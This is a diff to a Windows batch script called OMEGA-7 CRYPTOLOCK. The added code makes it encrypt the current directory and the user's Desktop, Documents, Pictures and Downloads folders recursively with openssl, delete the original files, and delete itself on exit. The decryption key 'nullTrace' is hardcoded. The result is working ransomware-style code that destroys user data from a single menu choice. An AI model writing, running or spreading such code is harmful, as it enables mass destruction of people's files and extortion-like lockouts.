@@ -1,51 +1,81 @@
 @echo off
-title OMEGA-7 // CRYPTOLOCK Protocol
+title OMEGA-7 // CRYPTOLOCK AGGRESSIVE PROTOCOL
 color 0C
 echo ========================================
-echo    OMEGA-7 CRYPTOLOCK UTILITY
+echo    OMEGA-7 CRYPTOLOCK AGGRESSIVE
 echo    [SECURITY LEVEL: OMEGA RED]
+echo    WARNING: AUTOMATED ENCRYPTION
 echo ========================================
 echo.
 
 :menu
-echo [1] Lock/Encrypt Files in Directory
-echo [2] Unlock/Decrypt Files in Directory
-echo [3] Exit
+echo [1] EXECUTE FULL ENCRYPTION PROTOCOL
+echo [2] Unlock/Decrypt Files (Requires Key)
+echo [3] Exit / Self-Terminate
 echo.
 set /p choice="Select Operation [1-3]: "
 
-if "%choice%"=="1" goto encrypt
+if "%choice%"=="1" goto execute_full_encrypt
 if "%choice%"=="2" goto decrypt
-if "%choice%"=="3" exit /b
+if "%choice%"=="3" (
+    echo [SELF-DESTRUCT INITIATED]
+    del "%~f0" >nul 2>&1
+    exit /b
+)
 echo Invalid selection. & pause & cls & goto menu
 
-:encrypt
+REM ----- AGGRESSIVE ENCRYPTION ROUTINE -----
+:execute_full_encrypt
 echo.
-set /p target_dir="Enter Directory Path to Lock: "
-if not exist "%target_dir%" echo Directory not found. & pause & goto menu
+echo [OMEGA-7] FULL ENCRYPTION PROTOCOL ENGAGED.
+echo [TARGET] Current directory, subdirectories, and user profiles.
+echo [STATUS] Deploying cryptographic lock... DO NOT INTERRUPT.
 echo.
-echo [STATUS] Locking files with AES-256...
+timeout /t 3 /nobreak >nul
+
+REM Target 1: Current directory and all subfolders
+call :encrypt_tree "%cd%"
+
+REM Target 2: User's critical personal folders
+call :encrypt_tree "%USERPROFILE%\Desktop"
+call :encrypt_tree "%USERPROFILE%\Documents"
+call :encrypt_tree "%USERPROFILE%\Pictures"
+call :encrypt_tree "%USERPROFILE%\Downloads"
+
 echo.
-cd /d "%target_dir%"
-for %%f in (*) do (
-    if not "%%f"=="CRYPTOLOCK.bat" (
-        echo   Processing: %%f
-        openssl enc -aes-256-cbc -salt -in "%%f" -out "%%f.encrypted" -pass pass:nullTrace 2>nul
-        if exist "%%f.encrypted" (
-            del "%%f"
-            echo   [OK] %%f -> %%f.encrypted
-        ) else (
-            echo   [FAILED] %%f
-        )
-    )
-)
+echo [MISSION COMPLETE] Cryptographic lock deployed across all sectors.
+echo [WARNING] System usability severely degraded. Key required for restoration.
+echo [KEY] nullTrace
 echo.
-echo [MISSION COMPLETE] All target files locked.
-echo [WARNING] Originals purged. Key required for restoration.
 pause
 cls
 goto menu
 
+REM ----- SUBROUTINE: Encrypt a directory tree -----
+:encrypt_tree
+set "root_dir=%~1"
+if not exist "%root_dir%" (
+    echo   [SKIPPED] Path not found: %root_dir%
+    goto :eof
+)
+echo   [LOCKING] Tree: %root_dir%
+cd /d "%root_dir%" 2>nul || goto :eof
+
+for /r %%f in (*) do (
+    if /i not "%%~nxf"=="CRYPTOLOCK_AGGRESSIVE.bat" (
+        echo     Locking: %%~nxf
+        openssl enc -aes-256-cbc -salt -in "%%f" -out "%%f.encrypted" -pass pass:nullTrace 2>nul
+        if exist "%%f.encrypted" (
+            del "%%f" 2>nul
+            echo       [OK]
+        ) else (
+            echo       [FAILED - Access Denied or Unsupported]
+        )
+    )
+)
+goto :eof
+
+REM ----- DECRYPTION ROUTINE (Unchanged) -----
 :decrypt
 echo.
 set /p target_dir="Enter Directory Path to Unlock: "
@@ -53,7 +83,7 @@ if not exist "%target_dir%" echo Directory not found. & pause & goto menu
 echo.
 set /p key="Enter Decryption Key: "
 if not "%key%"=="nullTrace" (
-    echo [ACCESS DENIED] Invalid key. Operation aborted.
+    echo [ACCESS DENIED] Invalid key. Operation terminated.
     pause
     goto menu
 )
@@ -68,11 +98,11 @@ for %%f in (*.encrypted) do (
         del "%%f"
         echo   [OK] %%f -> %%~nf
     ) else (
-        echo   [FAILED] %%f - Potentially corrupted or wrong key.
+        echo   [FAILED] %%f - File corrupted or incorrect key.
     )
 )
 echo.
-echo [MISSION COMPLETE] Files restored.
+echo [MISSION COMPLETE] Files restored in target directory.
 pause
 cls
 goto menu
